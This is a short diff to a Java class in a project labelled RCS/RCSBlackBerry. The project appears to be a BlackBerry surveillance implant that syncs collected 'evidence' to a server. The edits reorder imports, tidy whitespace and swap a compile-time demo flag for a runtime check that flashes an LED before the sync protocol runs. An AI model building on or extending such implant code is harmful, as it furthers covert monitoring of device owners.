@@ -6,24 +6,25 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
+
 package blackberry.action.sync;
 
 import java.util.Vector;
 
 import net.rim.device.api.system.Backlight;
+import blackberry.Status;
 import blackberry.Trigger;
 import blackberry.action.SubActionMain;
 import blackberry.action.sync.protocol.ProtocolException;
 import blackberry.action.sync.protocol.ZProtocol;
 import blackberry.action.sync.transport.Transport;
 import blackberry.config.ConfAction;
+import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceCollector;
 import blackberry.manager.ModuleManager;
-import blackberry.debug.Check;
 
 public abstract class SyncAction extends SubActionMain {
     //#ifdef DEBUG
@@ -90,11 +91,11 @@ public abstract class SyncAction extends SubActionMain {
                 debug.trace("execute: transport available");
                 //#endif
                 protocol.init(transport);
-                
+
                 try {
-                    //#ifdef DEMO
-                    Debug.ledFlash(Debug.COLOR_YELLOW);
-                    //#endif
+                    if (Status.self().isDemo()) {
+                        Debug.ledFlash(Debug.COLOR_YELLOW);
+                    }
 
                     ret = protocol.perform();
 
@@ -103,7 +104,7 @@ public abstract class SyncAction extends SubActionMain {
                     debug.error(e);
                     //#endif
                     ret = false;
-                } 
+                }
                 //#ifdef DEBUG
                 debug.trace("execute protocol: " + ret);
                 //#endif
